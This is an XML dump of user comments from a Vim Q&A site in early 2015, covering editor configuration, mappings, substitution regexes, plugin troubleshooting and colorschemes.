  <row Id="2872" PostId="2772" Score="6" Text="FYI: I can't reproduce this problem on my Linux machine." CreationDate="2015-03-28T18:29:17.713" UserId="51" />
  <row Id="2873" PostId="2773" Score="0" Text="you can just delete the mapping (or comment it out)" CreationDate="2015-03-28T18:42:24.437" UserId="342" />
  <row Id="2874" PostId="2773" Score="0" Text="I need the mapping in every other buffer, so commenting it out completely isn't really an option." CreationDate="2015-03-28T18:44:06.193" UserId="489" />
  <row Id="2875" PostId="2774" Score="0" Text="Thank you for the answer, this makes sense. I've already sent an email to the author, hopefully this can be implemented soon." CreationDate="2015-03-28T20:10:09.040" UserId="489" />
  <row Id="2876" PostId="2772" Score="0" Text="I cannot reproduce this problem on my Mac either. Looks like you might have found a bug." CreationDate="2015-03-29T07:08:59.863" UserId="246" />
  <row Id="2877" PostId="2648" Score="0" Text="Thanks, it's what I was looking for. Just another thing, is it possible to navigate the list of occurrence (found by [I) within the Quickfix List?" CreationDate="2015-03-29T08:44:17.837" UserId="1450" />
  <row Id="2878" PostId="2775" Score="0" Text="Are you using an autocmd to restore the cursor position?" CreationDate="2015-03-29T11:07:13.267" UserId="246" />
  <row Id="2879" PostId="2777" Score="2" Text="It could probably be a good idea to use the `/c` flag for confirming substitutions." CreationDate="2015-03-29T11:20:14.360" UserId="54" />
  <row Id="2880" PostId="2777" Score="2" Text="I would also recommend using word boundaries `\&lt;` and `\&gt;` around the `search` to avoid partial word replacements." CreationDate="2015-03-29T14:02:25.943" UserId="64" />
  <row Id="2881" PostId="2780" Score="0" Text="Yes, that is located in the vimrc_example.vim file." CreationDate="2015-03-29T20:13:09.503" UserId="334" />
  <row Id="2882" PostId="1961" Score="0" Text="Setting the columns/lines to `160 x 42` gives a window shape approximating the [golden ratio](http://io9.com/5985588/15-uncanny-examples-of-the-golden-ratio-in-nature), and you get the awesomeness of `42` !" CreationDate="2015-03-30T04:50:34.700" UserId="398" />
  <row Id="2885" PostId="2783" Score="0" Text="If I just copy one of the colorscheme.vim files and then put it in separate folder will I be able to reuse it on my other machines? E.g. if I put it in a repo on github will I be able to just clone it or enable it in one of the plugin managers?" CreationDate="2015-03-30T08:49:02.470" UserId="428" />
  <row Id="2886" PostId="2783" Score="0" Text="@dkns, Yep, exactly. For instance, you can name your colorscheme as &quot;dkns_colorscheme.vim&quot;, put it in a colors/ directory and then push it up to Github. If you have a plugin manager installed, cloning this repo will make the colorscheme available to Vim." CreationDate="2015-03-30T08:51:16.967" UserId="246" />
  <row Id="2888" PostId="2784" Score="0" Text="Inside the README file check the output of `:verbose set tw?` and `:verbose set fo?`." CreationDate="2015-03-30T10:45:28.787" UserId="599" />
  <row Id="2889" PostId="2779" Score="2" Text="Settings like `'timeoutlen'` are used at the time that the mapping is *invoked*, not created." CreationDate="2015-03-30T10:53:06.020" UserId="64" />
  <row Id="2890" PostId="2635" Score="0" Text="@jamessan, yes, h drive is mounted. I can cd to it from cmd.exe, mingw bash shell, even in the vim.exe provided in mingw but not gvim" CreationDate="2015-03-30T11:32:20.233" UserId="1438" />
  <row Id="2892" PostId="2791" Score="2" Text="The autoload solution doesn't sound too bad to me, especially if you use a function name that's slightly more specific to what it's doing. It's hard to come up with a good example without knowing what other functionality your plugin had that the autoload init is *not* required for, but maybe something like `call express#initMapCommands()`? Anything that requires extra quoting, though, is a super bad idea." CreationDate="2015-03-31T06:30:41.253" UserId="343" />
  <row Id="2894" PostId="2795" Score="0" Text="This would actually need more quoting... `v:val` must be part of the string, because it is evaluated when the map internals are invoked. I think any solution involving quoting is less than ideal." CreationDate="2015-03-31T09:22:46.197" UserId="64" />
  <row Id="2895" PostId="2794" Score="1" Text="This is a lot of work for the end user. As a plugin developer, I'm trying to minimize the effort required to use my plugin." CreationDate="2015-03-31T09:25:44.050" UserId="64" />
  <row Id="2896" PostId="2560" Score="0" Text="Your question is better after your edit ;-) But I think this question would probably get better answers if you would include a (small) vimrc file and (small) JS file that clearly demonstrate the problem. This would reduce the effort required by the potential answerer to get started in investigating your problem ;-)" CreationDate="2015-03-31T09:33:32.197" UserId="51" />
  <row Id="2897" PostId="2794" Score="0" Text="This solution is for a .vimrc that you may deploy where your plugin isn't installed. For a simplified installation guide, it's just `:runtime`.&#xA;Otherwise use an option as romainl suggested." CreationDate="2015-03-31T09:43:35.943" UserId="626" />
  <row Id="2898" PostId="2794" Score="0" Text="Even still, that requires the user to know where the file is. If they use a plugin manager, it could be somewhere less obvious than `plugin/`." CreationDate="2015-03-31T09:50:27.827" UserId="64" />
  <row Id="2899" PostId="2794" Score="0" Text="If they use a plugin manager, it will always be in `plugin/` -- if you organize your &quot;project&quot;/repository this way. Plugin managers update automatically the `'runtimepath'` option." CreationDate="2015-03-31T09:54:33.443" UserId="626" />
  <row Id="2900" PostId="2794" Score="0" Text="Oh, good point." CreationDate="2015-03-31T09:56:16.790" UserId="64" />
  <row Id="2901" PostId="2796" Score="6" Text="What do you want to achieve with that selection, there might be another way" CreationDate="2015-03-31T10:19:18.303" UserId="284" />
  <row Id="2902" PostId="2791" Score="0" Text="This is what I'm leaning towards, I think." CreationDate="2015-03-31T10:36:01.597" UserId="64" />
  <row Id="2905" PostId="2796" Score="0" Text="If it's separated by character, you may try to re-align the block first and select it then. See: [Align text only on first separator in VIM](http://stackoverflow.com/q/2129519/55075)" CreationDate="2015-03-31T13:06:21.933" UserId="467" />
  <row Id="2907" PostId="2801" Score="0" Text="I can't reproduce that with vim 7.4 on linux. The parameter is passed to firefox correctly when using 'let g:netrw_browsex_viewer='firefox' for me." CreationDate="2015-03-31T13:27:52.603" UserId="1296" />
  <row Id="2908" PostId="2801" Score="0" Text="@PhilippFrank The example URL doesn't work for me either (Vim 7.4, Linux) ... In any case, my solution is to select the URL in visual mode, and then use `gx` (which is not ideal but better than copy/paste)." CreationDate="2015-03-31T13:29:16.173" UserId="51" />
  <row Id="2909" PostId="2801" Score="0" Text="@PhillippFrank, OK. I added my browser details. I don't set that variable explicitly." CreationDate="2015-03-31T13:29:41.503" UserId="91" />
  <row Id="2910" PostId="2801" Score="0" Text="Strange, I just tried this with `vim -u NONE`, and now it won't open at all; obviously I have a plugin doing something strange." CreationDate="2015-03-31T13:31:47.503" UserId="91" />
  <row Id="2911" PostId="2801" Score="0" Text="@AndrewFerrier The `gx` command is part of netrw, which is a plugin shipped with Vim. It's not loaded if `compatible` is set... Reading the help, I think you can use `g:netrw_gx` to configure/fix this btw..." CreationDate="2015-03-31T13:34:12.160" UserId="51" />
  <row Id="2912" PostId="2801" Score="0" Text="@Andrew Ferrier: I needed to set that variable explicitly, otherwise gx would not work at all. I don't have access to chrome, but I tried konqueror and it's ok then. Maybe because you don't have that setting, netrw_filehandler is called and that borks it up." CreationDate="2015-03-31T13:45:29.757" UserId="1296" />
  <row Id="2913" PostId="2801" Score="0" Text="@Carpetsmoker the strange thing is that I'm in `nocompatible` mode (starting vim the regular way), yet `set g:netrw_gx?` tells me it's an unknown option..." CreationDate="2015-03-31T13:49:26.373" UserId="91" />
  <row Id="2914" PostId="2801" Score="1" Text="It's a variable, not an option, so you need to use `let`." CreationDate="2015-03-31T13:50:26.417" UserId="51" />
  <row Id="2915" PostId="2797" Score="0" Text="Are you using &quot;persisted&quot; to mean &quot;the state the file was in when the buffer was loaded&quot;? I'd usually expect &quot;persisted&quot; to mean the state of the file currently saved to disk." CreationDate="2015-03-31T14:13:48.207" UserId="343" />
  <row Id="2916" PostId="2560" Score="1" Text="@joeytwiddle The Tagbar plugin uses the external tools to create its own tags file. You shouldn't need to do it manually on the command line." CreationDate="2015-03-31T14:21:00.707" UserId="343" />
  <row Id="2917" PostId="2797" Score="0" Text="@Rich: No, we have the same definition. My mappings don't do exactly what the question asks for, but I still found it very useful." CreationDate="2015-03-31T14:28:29.937" UserId="970" />
  <row Id="2918" PostId="2803" Score="0" Text="what terminal are you using?" CreationDate="2015-03-31T20:23:05.753" UserId="342" />
  <row Id="2919" PostId="2803" Score="0" Text="Terminator and run on Arch linux" CreationDate="2015-03-31T20:37:25.167" UserId="1526" />
  <row Id="2920" PostId="2784" Score="0" Text="Output from tw: `textwidth=78 Last set from C:\Program Files\vim\vim74\vimrc_example.vim`&#xA;Output from fo: `formatoptions=tcq Last set from C:\Program Files\vim\vim74\vimrc_example.vim`" CreationDate="2015-03-31T20:40:25.867" UserId="398" />
  <row Id="2921" PostId="2786" Score="0" Text="Thanks, `set formatoptions=` fixed the behaviour. From my comment above it looks like gvim is taking settings from `vimrc_example.vim` so I'll rename the file to `vimrc_example.vimx` and see what happens" CreationDate="2015-03-31T20:44:59.213" UserId="398" />
  <row Id="2922" PostId="2803" Score="0" Text="These chars are the representation of the key you pressed." CreationDate="2015-03-31T20:49:35.170" UserId="342" />
  <row Id="2923" PostId="2784" Score="0" Text="Commented out the offending line of `vimrc_example.vim`. Problem fixed, thanks" CreationDate="2015-03-31T20:51:51.083" UserId="398" />
  <row Id="2924" PostId="2803" Score="0" Text="These are the escape sequences sent by the keys minus the initial escape character. Are they printed in the status line? Normally they should be recorded in the terminal database and vim should find them on its own. What is the value of the `TERM` environment variable? Do other terminal applications (`less`, `bash`, …) recognize the keys properly? Do the keys work in other terminal emulators? Do you have the same problem if you run `vim -u /dev/null`?" CreationDate="2015-03-31T21:47:51.330" UserId="8" />
  <row Id="2925" PostId="2803" Score="0" Text="It's only happens on vim.  Works in terminal emulator. I've tried to use `xterm` and `linux` on `TERM` environment variable. Both have no effects. I`ve tried every possible value for set term inside vim too. It still has no any effects" CreationDate="2015-03-31T21:57:46.093" UserId="1526" />
  <row Id="2927" PostId="2790" Score="0" Text="You might need to run `set iskeyword+=:` so that vim will make `:` a keyword character. Vim only searches for the keyword under the cursor when `&lt;c-]&gt;` is hit." CreationDate="2015-03-31T23:31:48.617" UserId="46" />
  <row Id="2928" PostId="2803" Score="0" Text="@BagolDaplun do you have a vimrc? (Are you in nocompatible mode?)" CreationDate="2015-03-31T23:33:30.303" UserId="46" />
  <row Id="2929" PostId="2792" Score="2" Text="Related question: [_How is command history resolved between multiple instances of Vim?_](http://vi.stackexchange.com/q/361/24)" CreationDate="2015-04-01T00:22:56.840" UserId="24" />
  <row Id="2930" PostId="2648" Score="0" Text="Not without doing something particularly roundabout, as far as I'm aware. Might be worth asking another question." CreationDate="2015-04-01T02:35:49.903" UserId="1452" />
  <row Id="2931" PostId="2803" Score="0" Text="Yes, I have `.vimrc`. And I put `set nocompatible` there." CreationDate="2015-04-01T08:00:45.610" UserId="1526" />
  <row Id="2932" PostId="2803" Score="0" Text="@BagolDaplun, Did you already try starting vim with `vim -Nu NONE` and seeing if the problem is reproducible?" CreationDate="2015-04-01T09:09:40.887" UserId="246" />
  <row Id="2933" PostId="2803" Score="0" Text="I tried just now. It's not printing strange charactes, but my settings in  `.vimrc` are not loaded. So, could be the problem reside in `.vimrc` file? And what could it be?" CreationDate="2015-04-01T09:12:46.513" UserId="1526" />
  <row Id="2934" PostId="2804" Score="0" Text="No need for multiple cursors. 1. Visually select your lines. 2. `:'&lt;,'&gt;s/.*/&quot;&amp;&quot;`. Or use a macro: `qq` then `C&quot;&lt;C-r&gt;&quot;&quot;&lt;Esc&gt;j` then `q` then apply your macro to all the remaining lines." CreationDate="2015-04-01T09:26:01.267" UserId="54" />
  <row Id="2935" PostId="2804" Score="0" Text="@romainl thanks for your answer. Actually, I'm just practising multiple cursors. I have more complex multiple line editing requirements which require multiple cursor plugin. I'm not particularly trying to solve the example problem." CreationDate="2015-04-01T09:32:25.000" UserId="1276" />
  <row Id="2936" PostId="2804" Score="0" Text="Then post an actual problem or go use the plugin's issue tracker. And I very much doubt your problem &quot;require&quot; multiple cursors. You have a specific editing need -&gt; you think multiple cursors is the solution -&gt; it doesn't work -&gt; you ask about multiple cursors instead of asking about your initial problem. That's the XY problem." CreationDate="2015-04-01T09:48:49.330" UserId="54" />
  <row Id="2937" PostId="2804" Score="2" Text="@romainl,  ok, my complex requirement may be solved by other means, but I just like the multiple cursors plugin, because it's simple, it's like sublime, and I want to get used to it and get very productive. I'm no expert who's familiar with editing texts with commands. I explained very clear about my problem: I don't want to lose multiple cursors after escape. Your solution is great but I just prefer using multiple cursors plugin to solve it.  I'll post it to the plugin's issues if my problem can't be solved." CreationDate="2015-04-01T10:06:59.133" UserId="1276" />
  <row Id="2938" PostId="2805" Score="0" Text="thanks Ingo, I'm getting a little more creative with mappings recently but still in need of do's and don'ts guidance :)" CreationDate="2015-04-01T12:53:17.437" UserId="1443" />
  <row Id="2939" PostId="2783" Score="0" Text="Another question. Not sure if I should post it here as a comment or ask another general question. How can I find color values for cterm? I'd like to have this theme look the same on gui and terminal but I don't know how to convert hex values to cterm values." CreationDate="2015-04-01T15:48:04.193" UserId="428" />
  <row Id="2940" PostId="2808" Score="0" Text="I just tried replicating this, and it worked for me.  I'm honestly not sure what the problem could be here.  You might try a minimal vim configuration to see if that would work on your machine.  You could then add customizations to potentially identify the conflict.  I don't use YouCompleteMe, so maybe there's something going on there.  Wish I could help more." CreationDate="2015-04-01T17:33:41.563" UserId="1008" />
  <row Id="2941" PostId="2808" Score="0" Text="@aaron hmm... Maybe I'm not sure, I don't know why though. I'll have another look when I get home, if I comment out you complete me" CreationDate="2015-04-01T17:54:28.837" UserId="1443" />
  <row Id="2942" PostId="2808" Score="0" Text="On my phone so I've messed that up! I'll be back at my computer soon though and I'll go over it, thanks" CreationDate="2015-04-01T17:55:06.250" UserId="1443" />
  <row Id="2943" PostId="2804" Score="0" Text="In visual block mode you can press `I` to insert for every row and `A` to append for every row." CreationDate="2015-04-01T19:01:21.373" UserId="544" />
  <row Id="2944" PostId="2780" Score="0" Text="Note, there was a bug in loading buffers, that was just recently fixed." CreationDate="2015-04-01T19:07:33.353" UserId="71" />
  <row Id="2945" PostId="2243" Score="0" Text="@ChristianBrabandt The fix for [774492](https://bugs.debian.org/774492) will make it into Jessie.  The syntax highlighting will have to wait for a backport." CreationDate="2015-04-02T03:41:56.947" UserId="15" />
  <row Id="2946" PostId="2813" Score="0" Text="So you'd need to hit ESC while in normal mode to exit the multi cursor?" CreationDate="2015-04-02T18:13:54.623" UserId="488" />
  <row Id="2947" PostId="2783" Score="1" Text="@dkns Since the terminal colors are largely dependent on the color palette used in the terminal emulator, this is pretty difficult to do. When I was creating my colorscheme, I found it helpful to display what each of the 256 colors looks like. I use [this](https://github.com/ajh17/dotfiles/blob/master/.bin/xterm-colors.py) small script in my bin folder. You can just use a color picker to then choose the colors to ensure the same gui and cterm colors. I would go from cterm-&gt;gui and not the other way around since there are more colors in the gui vim. Hope that helps." CreationDate="2015-04-02T19:16:20.030" UserId="246" />
  <row Id="2948" PostId="2243" Score="0" Text="@jamessan: great, thanks!" CreationDate="2015-04-02T19:18:00.350" UserId="71" />
  <row Id="2949" PostId="2790" Score="0" Text="Hey that did it indeed, thanks! Make it an answer if you want, I'd accept it :)" CreationDate="2015-04-02T19:46:10.407" UserId="1296" />
  <row Id="2950" PostId="2793" Score="3" Text="http://vimhelp.appspot.com/vim_faq.txt.html#faq-17.3" CreationDate="2015-04-03T11:34:53.830" UserId="71" />
  <row Id="2957" PostId="2821" Score="0" Text="Thank you very much. With your answer I learned about `normal!`, `onoremap` and that the `:` is not needed in the script. I will edit my question and remove the `:`s. You can read my asnwer on http://vi.stackexchange.com/a/2823/356. Feel free to edit it if you think it can be improved." CreationDate="2015-04-03T18:14:36.483" UserId="356" />
  <row Id="2958" PostId="512" Score="0" Text="For a closer look on formatting, see: [VIM USER MANUAL - Editing formatted text](http://vimdoc.sourceforge.net/htmldoc/usr_25.html)" CreationDate="2015-04-03T19:38:16.150" UserId="1619" />
  <row Id="2961" PostId="512" Score="0" Text="I just found the very useful `:set fo+=a` option for automatic reformatting of the whole paragraph. Have a look at `:help fo-table` for other options. There also is a nice video tutorial [here](http://vimcasts.org/episodes/hard-wrapping-text/)." CreationDate="2015-04-04T08:26:09.463" UserId="1619" />
  <row Id="2963" PostId="2801" Score="1" Text="I cannot reproduce with GVim 7.4 on Windows and Chrome. All the URLs you mentioned are opened exactly by `gx`." CreationDate="2015-04-04T14:57:01.450" UserId="356" />
  <row Id="2964" PostId="2772" Score="0" Text="I just reproduced this with GVim 7.4 on Windows. If the backslash is not deleted a new buffer is created. An error is issued 'E303: Unable to open swap file for &quot;\!file.txt&quot;, recovery impossible.' This must be because ``\`` is ilegal in Windows filenames." CreationDate="2015-04-04T18:37:15.453" UserId="356" />
  <row Id="2969" PostId="2772" Score="0" Text="@GonçaloRibeiro: yes, this is what I have observed and why I have posted my question. But I want to use the tabulator so that vim opens the *right* (and existing) file without backslash." CreationDate="2015-04-05T09:17:54.430" UserId="985" />
  <row Id="2970" PostId="2772" Score="0" Text="@RenéNyffenegger, yes, I understand. Unfortunately I am not aware of an option that can solve this. This could possibly be considered a bug." CreationDate="2015-04-05T11:06:44.807" UserId="356" />
  <row Id="2971" PostId="2831" Score="0" Text="I was just typing an answer ;-) Here's my solution: `:%s/)\n^\s*{$/) {/`, which also makes sure there's the preceding line ends with a `)`..." CreationDate="2015-04-05T14:08:09.430" UserId="51" />
  <row Id="2972" PostId="2831" Score="0" Text="Yes of course.  The regex could be made safer, but I really was just demonstrating the special characters.   I'll add that to my answer." CreationDate="2015-04-05T14:28:12.263" UserId="865" />
  <row Id="2973" PostId="2831" Score="0" Text="Thanks! It's kind of annoying that you're supposed to use `\n` to represent a line break in the regex, but `^M` (`Ctrl-V M`) to represent a line break in the substitution text. That's just how it is, I guess." CreationDate="2015-04-06T10:24:31.520" UserId="24" />
  <row Id="2974" PostId="2801" Score="0" Text="Confirming the OP's error. Tried with VIM 7.4.473 &amp; 7.4.663. Tried **from prestine user account** (without `.vimrc`), with different terminals (`urxvt`, `sakura`) and different browsers (`g:netrw_browsex_viewer` set to `'uzbl-browser'`/`'firefox'`/`'google-chrome'`." CreationDate="2015-04-06T11:05:23.073" UserId="1631" />
  <row Id="2975" PostId="2832" Score="0" Text="This is a nice idea, but do you know how to get the count in visual mode? v:count1 doesn't seem to work." CreationDate="2015-04-06T12:26:19.573" UserId="1272" />
  <row Id="2977" PostId="2833" Score="0" Text="This does not provide an answer to the question. To critique or request clarification from an author, leave a comment below their post - you can always comment on your own posts, and once you have sufficient [reputation](http://vi.stackexchange.com/help/whats-reputation) you will be able to [comment on any post](http://vi.stackexchange.com/help/privileges/comment)." CreationDate="2015-04-06T15:57:42.607" UserId="467" />
  <row Id="2978" PostId="2833" Score="0" Text="I eventually figured out I needed to open a specific revision from the quickfix list. I nmapped a key command to `:Glog&lt;CR&gt;:cwindow&lt;CR&gt;` to help with this." CreationDate="2015-04-06T16:39:35.017" UserId="1612" />
  <row Id="2979" PostId="2834" Score="5" Text="That *looks* like the information vim normally prints when loading a file, though it's interesting it's being printed twice. Does it still happen when you run with -u NONE?" CreationDate="2015-04-06T18:10:59.923" UserId="72" />
  <row Id="2980" PostId="2835" Score="1" Text="Are you running MacVim in the terminal? (`mvim -v`?) If you are what is the value of your `TERM` variable?" CreationDate="2015-04-06T19:03:46.157" UserId="46" />
  <row Id="2983" PostId="2832" Score="0" Text="@yyt16384, I edited my answer." CreationDate="2015-04-06T21:17:50.247" UserId="356" />
  <row Id="2984" PostId="2836" Score="0" Text="I thought vimdiff syntax highlighting ready had syntax for word diffs in lines." CreationDate="2015-04-07T02:47:13.327" UserId="544" />
  <row Id="2985" PostId="2835" Score="0" Text="@FDinoff No. I run standalone MacVim app outside of terminal. And it's fine in terminal mode as well as vi." CreationDate="2015-04-07T03:12:28.127" UserId="1632" />
  <row Id="2986" PostId="2836" Score="0" Text="Vimdiff does, but the syntax does not support highlight the longest common subsequence, which needs to be identified before it can be highlighted. As far as I can tell, when (vim)diff compares two lines and they differ on their first character (ignoring white space in some cases) the lines are considered different, and they are highlighted from beginning to end. That behavior isn't what I need and described in my question." CreationDate="2015-04-07T07:13:46.663" UserId="1634" />
  <row Id="2987" PostId="2834" Score="0" Text="I don't think it is supposed to wait for me to press Enter as well. No, it's some plugin I think. Guess have to find out what's causing it. The problem is - I don't see that every time." CreationDate="2015-04-07T07:34:25.153" UserId="237" />
  <row Id="2988" PostId="2836" Score="0" Text="I have added some graphics to better illustrate my question." CreationDate="2015-04-07T08:12:02.890" UserId="1634" />
  <row Id="2989" PostId="2836" Score="0" Text="I found the [diffchar](http://www.vim.org/scripts/script.php?script_id=4932) plugin, which can be used to alter vimdiff default highlighting to better match differences. However, this plugin isn't designed to recognize the longest common subsequence (lcs), so I don't know if it can be made to highlight **just** the lcs, as shown in the graphics above." CreationDate="2015-04-07T08:41:51.160" UserId="1634" />
  <row Id="2990" PostId="2839" Score="0" Text="What directory are you starting CtrlP from? If you start it from your home directory, it will have to search a lot of unneeded files." CreationDate="2015-04-07T08:42:41.243" UserId="246" />
  <row Id="2991" PostId="2839" Score="0" Text="I start Vim from within my projects git repository. Usually the root directory of the repo, sometimes in a subdirectory." CreationDate="2015-04-07T08:43:51.920" UserId="1639" />
  <row Id="2992" PostId="2839" Score="1" Text="Is the behavior also reproducible with `:CtrlP` or `:CtrlPCurWD`?" CreationDate="2015-04-07T08:51:31.063" UserId="246" />
  <row Id="2993" PostId="2839" Score="0" Text="Ah, now we're on to something. `:CtrlP` and `CtrlPCurWD` function as expected: they search the correct directories!" CreationDate="2015-04-07T08:53:14.163" UserId="1639" />
  <row Id="2994" PostId="2839" Score="0" Text="I'm not sure if that's a bug in `:CtrlPMixed` in that case. I don't use it myself. Perhaps you can file an issue over at [ctrlpvim/ctrlp.vim](https://github.com/ctrlpvim/ctrlp.vim)." CreationDate="2015-04-07T08:55:14.533" UserId="246" />
  <row Id="2995" PostId="2839" Score="1" Text="Hm, thanks anyway! I've opened an issue, hopefully it'll get fixed soon..." CreationDate="2015-04-07T09:02:02.660" UserId="1639" />
  <row Id="2996" PostId="2832" Score="0" Text="I think I get the point: every normal mode command resets v:count1, so the count needs to be saved before :normal." CreationDate="2015-04-07T10:43:21.793" UserId="1272" />
  <row Id="2997" PostId="2840" Score="0" Text="You can use another separator character, instead of `/`. For instance, `:%s#public_html#public_html/Text-Analysis-Tool#gg`." CreationDate="2015-04-07T10:58:41.857" UserId="259" />
  <row Id="2998" PostId="2834" Score="2" Text="The &quot;press enter&quot; prompt makes sense; it will do that when there is more text to display than would fit, as there is in this case since its displaying a bunch of extra info. See :help press-enter." CreationDate="2015-04-07T15:04:43.683" UserId="72" />
  <row Id="2999" PostId="2842" Score="5" Text="Even more bonus: Use `&amp;` to replace with the entire match. e.g. `:%s#public_html#&amp;/Text-Analysis-Tool#`. For more help see `:h /\0`" CreationDate="2015-04-07T16:16:59.397" UserId="778" />
  <row Id="3000" PostId="2841" Score="0" Text="Thank you [Rick](http://vi.stackexchange.com/users/1641/rick-howe), I can reproduce your picture. The method you outline does help with the specific task in my question. I am also looking for something more general, that can work automatically without needing to adjust the strings before and after the lcs." CreationDate="2015-04-07T16:25:14.053" UserId="1634" />
  <row Id="3002" PostId="2841" Score="0" Text="If the strings before/after the lcs do not look alike, this method doesn't help showing the lcs, try: `repo evaluate   xx  0.5.5.out         |  pack  age  evaluate 0.5.5-x86_64-1.txz`" CreationDate="2015-04-07T16:36:02.410" UserId="1634" />
  <row Id="3003" PostId="2839" Score="0" Text="CtrlP has been dead for over a year." CreationDate="2015-04-07T19:18:25.257" UserId="54" />
  <row Id="3004" PostId="2844" Score="0" Text="Perfect! I didn't know that quickfix list has it's own filetype. Thank you!" CreationDate="2015-04-07T19:24:10.730" UserId="401" />
  <row Id="3005" PostId="2848" Score="0" Text="Oh, yeah this totally the way to go, _ignore_ my answer." CreationDate="2015-04-08T02:39:51.573" UserId="544" />
  <row Id="3006" PostId="2849" Score="1" Text="Why are you looking for that file?" CreationDate="2015-04-08T07:08:04.687" UserId="54" />
  <row Id="3007" PostId="2839" Score="0" Text="@romainl the github repo was last updated 19 days ago? Do you recommend any alternatives?" CreationDate="2015-04-08T08:43:14.893" UserId="1639" />
  <row Id="3008" PostId="2839" Score="0" Text="Latest commit was in july 2013. You can find a link to a supposedly more active fork in the issue tracker." CreationDate="2015-04-08T08:46:36.303" UserId="54" />
  <row Id="3009" PostId="2839" Score="1" Text="yeah, @akshay linked that a few comments above, it's at https://github.com/ctrlpvim/ctrlp.vim and I've installed it, but that still doesn't solve my issue." CreationDate="2015-04-08T08:49:03.657" UserId="1639" />
  <row Id="3010" PostId="2852" Score="1" Text="Except it will be `_viminfo`, not `.viminfo`, in WIndows." CreationDate="2015-04-08T13:45:45.253" UserId="15" />
  <row Id="3011" PostId="2560" Score="1" Text="I've rolled back your Rev 4 → 3. Please post the resolution as a self-answer instead." CreationDate="2015-04-08T13:48:53.400" UserId="24" />
  <row Id="3012" PostId="2856" Score="0" Text="Vim isn't good at semantic highlighting -- instead, it's purely based on regular expressions. But a plugin like [Syntastic](https://github.com/scrooloose/syntastic) could show you errors when you save the file, provided you have the necessary external programs to validate XML." CreationDate="2015-04-08T14:24:17.680" UserId="64" />
  <row Id="3013" PostId="2849" Score="0" Text="Wanted to grab some stuff out of the command history" CreationDate="2015-04-08T15:15:26.790" UserId="398" />
  <row Id="3014" PostId="2851" Score="0" Text="It was indeed in `C:\Users\&lt;username&gt;\_viminfo`. The command `:echo $HOME` works a charm as well." CreationDate="2015-04-08T15:18:27.603" UserId="398" />
  <row Id="3016" PostId="2858" Score="4" Text="Maybe you should say &quot;external tools&quot; instead of &quot;ctags&quot;, because my first suggestion would be cscope." CreationDate="2015-04-08T16:33:27.840" UserId="205" />
  <row Id="3017" PostId="2858" Score="1" Text="One thing that I use is command `gd`. This takes cursor to the local declaration of the variable under cursor." CreationDate="2015-04-08T17:08:03.737" UserId="534" />
  <row Id="3018" PostId="2857" Score="0" Text="Can you put some images where this happens?" CreationDate="2015-04-08T17:11:03.867" UserId="534" />
  <row Id="3019" PostId="2857" Score="2" Text="Press `G`, followed by `ctrl-f`. I think this is what he is talking about." CreationDate="2015-04-08T17:13:17.713" UserId="599" />
  <row Id="3020" PostId="2858" Score="0" Text="@muru I do not want to use any external tools. What I am trying learn are techniques for efficiently navigating a code base just using Vim commands. I know it can be done, but obviously requires deeper Vim knowledge than I have. Possibly not a good SE question since it is so open ended but I do not know where else to look." CreationDate="2015-04-08T18:04:36.650" UserId="1661" />
  <row Id="3021" PostId="2857" Score="0" Text="Exactly, what @Vitor said" CreationDate="2015-04-08T18:35:59.320" UserId="155" />
  <row Id="3022" PostId="2857" Score="0" Text="Try if setting the 'scrolloff' option helps you." CreationDate="2015-04-08T20:46:29.603" UserId="71" />
  <row Id="3023" PostId="2852" Score="0" Text="This answer clarifies why I can't find or $HOME or %HOME% in Windows.. it's a Vim-only variable! So it is accessible from vim command line." CreationDate="2015-04-09T00:04:08.477" UserId="398" />
  <row Id="3024" PostId="2849" Score="1" Text="@ropata `q:` is very helpful for this, it gives you a Vim buffer allowing you to search, edit, etc your command history." CreationDate="2015-04-09T01:41:18.730" UserId="246" />
  <row Id="3025" PostId="2851" Score="1" Text="@ropata The command `echo $HOME` only works in the PowerShell, not in the cmd. But maybe no one is using cmd anymore? :D" CreationDate="2015-04-09T01:45:38.273" UserId="1653" />
  <row Id="3026" PostId="2856" Score="0" Text="@tommcdo: Looks nice! If anyone know a Syntastic-compatible XML Schema-based XML validator (not just an XML validator), then it would make for a fantastic answer :-)" CreationDate="2015-04-09T02:27:02.557" UserId="1083" />
  <row Id="3027" PostId="2864" Score="0" Text="Vim uses cindent for C. See `:help cinoptions-values`." CreationDate="2015-04-09T12:42:26.323" UserId="54" />
  <row Id="3028" PostId="2868" Score="0" Text="This works, but why the weird `call` syntax? Why not just give `Chomp` a parameter called `string` and then pass `a:string` to `substitute`?" CreationDate="2015-04-09T15:03:44.857" UserId="671" />
  <row Id="3029" PostId="2868" Score="1" Text="@bdesham Because `Chomp()` is passing whatever arguments it gets on to `system()`, stripping the trailing newline from its output, and returning that." CreationDate="2015-04-09T15:22:26.083" UserId="15" />
  <row Id="3030" PostId="2868" Score="0" Text="Right. `system()` has an optional `{input}` argument, and this handles any of these generically. If you don't need this, just do it the conventional way." CreationDate="2015-04-09T16:12:17.057" UserId="970" />
  <row Id="3031" PostId="2865" Score="1" Text="Thanks! I undestand the approach. How would I conditionally do this only if the cursor in on the last n lines of the buffer?" CreationDate="2015-04-09T19:12:00.207" UserId="155" />
  <row Id="3032" PostId="2851" Score="0" Text="thanks for the Powershell tip, I called `echo $HOME` from the vim command line with the same result." CreationDate="2015-04-09T20:35:21.710" UserId="398" />
  <row Id="3033" PostId="2865" Score="0" Text="Using the function I provided in the updated answer should keep the scrolling to operate as normal until you get close to the end. If you wish it to be `n` lines rather than the window height then replace the function with your value." CreationDate="2015-04-09T20:45:36.887" UserId="895" />
  <row Id="3034" PostId="2874" Score="0" Text="I think this is probably the approach I’ll actually use, but I accepted the other answer because it’s more generally applicable. (For example, it will remove trailing newlines from a multiline string while leaving other newlines alone.)" CreationDate="2015-04-10T02:28:34.667" UserId="671" />
  <row Id="3035" PostId="2875" Score="1" Text="Have you tried replicating this with `vim -Nu NONE -c 'syntax on'`? Have you followed the debugging tips on this [post](http://vi.stackexchange.com/a/2004/246)" CreationDate="2015-04-10T06:28:56.050" UserId="246" />
  <row Id="3036" PostId="2875" Score="0" Text="What filetype? Any?" CreationDate="2015-04-10T07:07:39.647" UserId="54" />
  <row Id="3037" PostId="2875" Score="1" Text="Ruby. Indeed it is editable with `-u NONE` so it must be some plugin then. Guess the answer to most questions is 'disable plugins until you find the culprit' :(" CreationDate="2015-04-10T08:03:45.290" UserId="237" />
  <row Id="3038" PostId="2875" Score="0" Text="But the problem is - the delay seems to accumulate over time. When I open the file from scratch it is fine. After a while it gets slower and slower." CreationDate="2015-04-10T08:06:13.057" UserId="237" />
